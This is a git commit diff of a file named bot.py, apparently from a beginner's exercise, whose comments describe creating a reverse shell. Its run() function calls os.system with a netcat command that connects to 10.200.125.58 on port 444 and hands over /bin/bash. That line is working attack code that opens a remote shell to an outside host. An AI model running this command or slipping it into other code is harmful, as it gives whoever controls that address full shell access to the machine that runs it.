7a0a7c34aaa3c38ed31c2a9d038ba41b239963cd
Sandra Teletor <64851516+sandraMartina@users.noreply.github.com>
2023-09-07 17:24:22 +0200

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,9 +1,16 @@
 #In here i thing we have to put or own code
-#  print("Hello World")
-import os
-#import subprocess
-#import sys
-#import socket 
 
+#### 1. FIRST EXCERSICE ES TO PRINT HELLO WORLD,  ====####
+#def run():
+  #print("Hello World")
+##############
+
+#Secund excersice is to create a revershell, in windows we must have linux terminal, so 
+#the first thing that we have to do is, import os library
+import os
+
+
+#Create a definition
 def run():
+  #Now we have to use the library, with the ip of windows, and with -e its the path of linux terminal
   os.system("nc -n 10.200.125.58 444 -e /bin/bash")
